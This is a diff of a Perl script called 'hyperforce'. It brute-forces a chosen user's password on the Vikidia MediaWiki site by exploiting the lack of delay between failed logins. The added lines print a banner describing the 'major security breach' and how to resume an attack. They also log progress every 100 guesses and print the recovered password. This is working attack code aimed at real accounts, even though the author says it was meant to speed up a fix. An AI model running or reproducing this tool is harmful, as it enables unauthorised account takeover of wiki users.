@@ -17,6 +17,18 @@ use strict;
 use LWP::UserAgent;
 use HTTP::Cookies;
 
+print "\n    *** Welcome to hyperforce! ***\n\n";
+print "  This little script try to guess your target's password on Vikidia.\n";
+print "  It is able to do it because of a *major security breach* in the\n";
+print "  MediaWiki's authentication process which allows a new login request\n";
+print "  immediatly after an erroneous one.\n\n";
+print "  You will be notified each 100 requests (because displaying each\n";
+print "  password slows the bruteforce). This allows you to relaunch the\n";
+print "  attack from a given password instead of from the beginning.\n";
+print "  Just modify in the code the first value of the \@struct variable.\n\n";
+print "  I made this program to accelerate the fixing procedure which was a\n";
+print "  little slow ;)\n\n";
+
 # GLOBAL
   my $ua = LWP::UserAgent->new(
     agent => 'Hyperion/5.0.perl (thilp/bot/lol)',
@@ -70,7 +82,7 @@ sub connexion
 # PASSWORD GENERATION
 
 # @struct describes the password structure
-my @struct = (0,0,0,0,0);
+my @struct = (0,0,20,24,0);
 # @table contains all the strings that can be assembled to generate $pwd
 my @table = (
   # WORDS
@@ -134,17 +146,19 @@ sub generate_pwd
 
 my $result;
 my $ret = 0;
+my $count = 0;
+my $pass;
 
 if (@ARGV == 1)
 {
   while ($ret == 0)
   {
-    my $pass = generate_pwd(\@struct);
-    print "Trying with $pass... ";
+    $pass = generate_pwd(\@struct);
+    print("Trying with ".$pass."...\n") if ($count % 100 == 0);
     $ret = connexion($ARGV[0], $pass, \$result);
-    print "doesn't match: $result.\n" if ($ret == 0);
+    $count++;
   }
-  print "PASSWORD FOUND!\n";
+  print "PASSWORD FOUND! >> ".$pass."\n";
 }
 else
 {
